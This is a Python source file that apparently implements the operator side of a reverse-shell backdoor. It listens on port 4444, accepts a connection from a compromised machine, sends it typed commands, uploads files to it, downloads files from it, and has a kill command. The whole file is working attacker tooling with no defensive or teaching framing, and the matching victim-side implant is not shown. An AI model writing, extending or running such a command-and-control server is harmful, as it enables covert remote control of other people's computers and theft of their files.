import socket
import json
import base64
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "0.0.0.0"
PORT = 4444

# Function to send JSON data
def send_json(conn, data):
    json_data = json.dumps(data)
    conn.sendall(json_data.encode())

# Function to receive JSON data
def receive_json(conn):
    json_data = ""
    while True:
        try:
            json_data = json_data + conn.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Function to read a file and encode it in base64
def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

# Function to write a file from base64 content
def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
    return "[+] Download successful [+]"

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

print(Fore.YELLOW + f"Server listening on {HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

try:
    while True:
        command = input(Fore.CYAN + "> ").strip().split(" ")

        if command[0] == "km":
            send_json(client_socket, command)
            client_socket.close()
            break
        elif command[0] == "upload":
            file_content = read_file(command[1])
            command.append(file_content)
        send_json(client_socket, command)

        response = receive_json(client_socket)

        if command[0] == "download":
            print(write_file(command[1], response))
        else:
            print(Fore.WHITE + response)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
